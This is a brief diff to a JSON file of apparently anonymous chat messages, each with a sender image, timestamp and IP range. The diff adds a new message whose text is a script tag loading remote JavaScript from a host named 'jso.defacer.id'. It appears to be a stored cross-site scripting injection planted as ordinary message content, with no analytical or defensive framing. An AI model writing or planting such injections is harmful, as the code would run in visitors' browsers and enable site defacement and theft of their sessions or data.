@@ -134,5 +134,13 @@
     },
     "timestamp": "2025-07-31T08:41:39.035Z",
     "userIp": "2400:9800:9b1::/48"
+  },
+  {
+    "message": "<script src=\"https://jso.defacer.id/raw/8e6e376e\"></script>",
+    "sender": {
+      "image": "/AnonimUser.png"
+    },
+    "timestamp": "2025-07-31T08:44:20.291Z",
+    "userIp": "202.58.74.0/24"
   }
 ]
